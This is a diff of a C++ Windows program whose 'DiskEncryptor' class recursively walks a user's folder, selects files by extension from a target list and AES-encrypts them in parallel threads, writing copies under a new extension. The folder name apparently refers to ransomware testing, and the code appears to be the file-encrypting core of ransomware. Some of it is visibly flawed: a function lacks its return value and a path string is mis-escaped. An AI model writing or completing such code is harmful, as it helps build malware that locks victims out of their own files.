@@ -1,16 +1,18 @@
-#include "diskencryptor.h"
-
 #include <iostream>
 #include <Windows.h>
-#include <cryptopp/ccm.h>
+#include <filesystem>
+#include <thread>
+
+#include <cryptopp/filters.h>
+#include <cryptopp/files.h>
+
+#include "diskencryptor.h"
+
+#define MAX_THREADS 3
 
 bool DiskEncryptor::setDisk(std::string disk)
 {
 	_disk = disk;
-#if DEBUG
-	std::clog << "0x" << &_disk << " Allocated Buffer :  _disk " << _disk << std::endl;
-#endif
-
 	return true;
 }
 
@@ -20,29 +22,55 @@ bool DiskEncryptor::setFreeSpace()
 	if (GetDiskFreeSpaceA(_disk.c_str(), &_sectorsPerCluster, &_bytesPerSector, &_numberOfFreeClusters, &_totalNumberOfClusters))
 	{
 		_freespace = (_sectorsPerCluster * _bytesPerSector * _numberOfFreeClusters);
-#if DEBUG
-		std::clog << "0x" << &_freespace << " Allocated Buffer :  _freespace " << _freespace << std::endl;
-		#endif
 		return true;
 	}
-	else
-	{
-#if DEBUG
-		std::clog << "Error : " << GetLastError() << std::endl;
-		#endif
-		return false;
+	return false;
+}
+
+bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
+{
+	_e.SetKeyWithIV(key.data(), key.size(), iv.data(), iv.size());
+	return true;
+}
+
+void DiskEncryptor::iterateFiles() {
+	std::vector<std::thread> threads;
+	
+	for (const auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\mXn\\Desktop\\fwareTest")) {
+		if (entry.is_directory()) {
+			continue;
+		}
+		else {
+			std::string ext = entry.path().extension().string();
+			for (std::string e : ext2Ecrypt) {
+				if (_freespace < entry.file_size()) {
+					break;
+				}
+				if (ext == e) {
+					if (threads.size() > 3) {
+						for (std::thread& t : threads) {
+							t.join();
+						}
+						threads.clear();
+					}
+					threads.emplace_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
+				}
+			}
+		}
 	}
+}
+
+bool DiskEncryptor::fileEncrypt(std::string file) {
+	std::ifstream in(file, std::ios::binary);
+	std::ofstream out(file + FILE_EXTENSION, std::ios::binary);
+	CryptoPP::FileSource(in, true, new CryptoPP::StreamTransformationFilter(_e, new CryptoPP::FileSink(out)));
 }
 
 DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
 {
 	setDisk(disk);
 	setFreeSpace();
-
-	CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption e;
-	e.SetKeyWithIV(key.data(), key.size(), iv.data(), iv.size());
-	
-
+	setEncryption(key, iv);
 }
 
 DiskEncryptor::~DiskEncryptor()
